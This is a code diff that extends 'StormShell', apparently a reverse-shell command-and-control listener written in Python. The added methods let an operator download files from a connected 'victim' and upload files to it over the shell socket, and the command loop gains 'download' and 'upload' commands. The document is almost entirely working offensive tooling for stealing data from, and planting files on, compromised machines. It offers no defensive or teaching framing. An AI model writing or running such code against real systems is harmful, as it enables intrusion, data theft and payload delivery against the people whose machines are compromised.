@@ -4,17 +4,20 @@ StormShell - Listener Module
 A lightweight TCP socket listener that accepts incoming reverse shell
 connections.  After a client connects, the listener enters an interactive
 command loop — sending operator commands to the agent and displaying the
-agent's responses.  Includes robust error handling and graceful teardown.
+agent's responses.  Supports file download (victim → attacker) and file
+upload (attacker → victim) via a size-prefixed binary transfer protocol.
 """
 
+import logging
+import os
 import socket
 import sys
-import logging
 
 # ---------------------------------------------------------------------------
 # Constants
 # ---------------------------------------------------------------------------
-BUFFER_SIZE = 4096  # Max bytes to receive per recv() call
+BUFFER_SIZE = 4096   # Max bytes to receive per recv() call
+HEADER_SIZE = 16     # Fixed-length header carrying the file size in bytes
 
 # ---------------------------------------------------------------------------
 # Logger configuration
@@ -128,6 +131,171 @@ class Listener:
             sys.exit(1)
 
     # ------------------------------------------------------------------
+    # Network helpers
+    # ------------------------------------------------------------------
+
+    def _recv_exact(self, length: int) -> bytes:
+        """
+        Receive exactly *length* bytes from the client socket.
+
+        Needed because TCP is a stream protocol — a single recv() may
+        return fewer bytes than requested.  This method loops until the
+        full payload has been assembled.
+
+        Args:
+            length: Number of bytes to receive.
+
+        Returns:
+            The complete byte string of the requested length.
+
+        Raises:
+            ConnectionError: If the remote end disconnects before the
+                             full payload is received.
+        """
+        data = b""
+        while len(data) < length:
+            chunk = self.client.recv(min(BUFFER_SIZE, length - len(data)))
+            if not chunk:
+                raise ConnectionError("Connection closed during transfer.")
+            data += chunk
+        return data
+
+    # ------------------------------------------------------------------
+    # File transfer handlers
+    # ------------------------------------------------------------------
+
+    def _handle_download(self, remote_path: str) -> bool:
+        """
+        Download a file from the agent (victim → attacker).
+
+        Protocol:
+            1. Listener sends ``download <path>`` (already done by caller).
+            2. Agent responds with a 16-byte size header.
+               - If the header starts with ``ERROR:`` the rest is an error
+                 message; print it and return.
+            3. Agent streams the file data in BUFFER_SIZE chunks.
+            4. Listener writes the received data to a local file.
+
+        Args:
+            remote_path: Path on the agent's filesystem to download.
+
+        Returns:
+            True if the loop should continue, False if connection broke.
+        """
+        try:
+            # --- Receive size header ---
+            header = self._recv_exact(HEADER_SIZE)
+            header_str = header.decode("utf-8").strip()
+
+            # Check for agent-side errors (file not found, etc.).
+            if header_str.startswith("ERROR:"):
+                error_data = self._recv_exact(int(header_str.split(":")[1]))
+                print(error_data.decode("utf-8", errors="replace"))
+                return True
+
+            file_size = int(header_str)
+            if file_size == 0:
+                print("[!] Remote file is empty (0 bytes).")
+                return True
+
+            # --- Receive file data ---
+            file_data = self._recv_exact(file_size)
+
+            # Save to the current directory using the basename of the
+            # remote path to avoid path-traversal issues.
+            local_name = os.path.basename(remote_path)
+            with open(local_name, "wb") as fp:
+                fp.write(file_data)
+
+            print(
+                f"[+] Downloaded '{remote_path}' → '{local_name}' "
+                f"({file_size:,} bytes)"
+            )
+            logger.info(
+                "Downloaded %s (%d bytes) → %s",
+                remote_path, file_size, local_name,
+            )
+            return True
+
+        except (ConnectionError, OSError) as exc:
+            print(f"[!] Download failed — {exc}")
+            logger.error("Download failed — %s", exc)
+            return False
+        except (ValueError, IndexError) as exc:
+            print(f"[!] Invalid download header — {exc}")
+            logger.error("Invalid download header — %s", exc)
+            return False
+
+    def _handle_upload(self, local_path: str) -> bool:
+        """
+        Upload a file from the attacker to the agent (attacker → victim).
+
+        Protocol:
+            1. Listener sends ``upload <path>`` (already done by caller).
+            2. Agent replies with ``READY`` acknowledgement.
+            3. Listener sends a 16-byte size header followed by file data
+               in BUFFER_SIZE chunks.
+            4. Agent writes the received data and sends a confirmation.
+
+        Args:
+            local_path: Path on the attacker's local filesystem to upload.
+
+        Returns:
+            True if the loop should continue, False if connection broke.
+        """
+        # --- Validate local file ---
+        if not os.path.isfile(local_path):
+            print(f"[!] Local file not found: {local_path}")
+            # Notify the agent so it doesn't hang waiting for data.
+            try:
+                self.client.sendall(b"UPLOAD_CANCEL")
+            except OSError:
+                pass
+            return True
+
+        try:
+            # --- Wait for agent READY signal ---
+            ready_signal = self.client.recv(BUFFER_SIZE)
+            if not ready_signal:
+                print("[!] Agent disconnected before upload.")
+                return False
+
+            signal_text = ready_signal.decode("utf-8", errors="replace").strip()
+            if signal_text != "READY":
+                print(f"[!] Unexpected agent response: {signal_text}")
+                return True
+
+            # --- Read file and send ---
+            with open(local_path, "rb") as fp:
+                file_data = fp.read()
+
+            file_size = len(file_data)
+            header = str(file_size).zfill(HEADER_SIZE).encode("utf-8")
+            self.client.sendall(header)
+
+            # Send in chunks to avoid overwhelming the socket buffer.
+            for offset in range(0, file_size, BUFFER_SIZE):
+                self.client.sendall(file_data[offset:offset + BUFFER_SIZE])
+
+            # --- Receive agent confirmation ---
+            confirmation = self.client.recv(BUFFER_SIZE)
+            if confirmation:
+                print(confirmation.decode("utf-8", errors="replace"))
+            else:
+                print("[!] Agent disconnected after upload.")
+                return False
+
+            logger.info(
+                "Uploaded %s (%d bytes) to agent.", local_path, file_size
+            )
+            return True
+
+        except (ConnectionError, OSError) as exc:
+            print(f"[!] Upload failed — {exc}")
+            logger.error("Upload failed — %s", exc)
+            return False
+
+    # ------------------------------------------------------------------
     # Interactive command loop
     # ------------------------------------------------------------------
 
@@ -138,8 +306,9 @@ class Listener:
         agent; the agent's response is then printed to the console.
 
         Special commands:
-            exit  — Send a shutdown signal to the agent and break out of
-                    the loop, triggering a graceful teardown.
+            exit                — Shut down the agent and close the session.
+            download <path>     — Download a file from the agent.
+            upload <local_path> — Upload a local file to the agent.
         """
         print("[*] Interactive session started. Type 'exit' to quit.\n")
         logger.info("Interactive command loop started.")
@@ -151,7 +320,6 @@ class Listener:
                 # Operator pressed Ctrl+C or Ctrl+D at the prompt.
                 print("\n[!] Interrupt received. Ending session …")
                 logger.warning("Operator interrupted the command prompt.")
-                # Attempt to notify the agent before exiting.
                 try:
                     self.client.sendall(b"exit")
                 except OSError:
@@ -177,11 +345,25 @@ class Listener:
                 logger.info("Exit command sent to agent.")
                 break
 
-            # --- Receive the agent's response ---
+            # --- Handle file transfer commands locally ---
+            lower = command.lower()
+
+            if lower.startswith("download "):
+                remote_path = command.split(" ", 1)[1].strip()
+                if not self._handle_download(remote_path):
+                    break
+                continue
+
+            if lower.startswith("upload "):
+                local_path = command.split(" ", 1)[1].strip()
+                if not self._handle_upload(local_path):
+                    break
+                continue
+
+            # --- Receive the agent's response (normal command) ---
             try:
                 response = self.client.recv(BUFFER_SIZE)
                 if not response:
-                    # Empty response means the agent disconnected.
                     print("[!] Agent disconnected.")
                     logger.warning("Agent sent empty response (disconnected).")
                     break
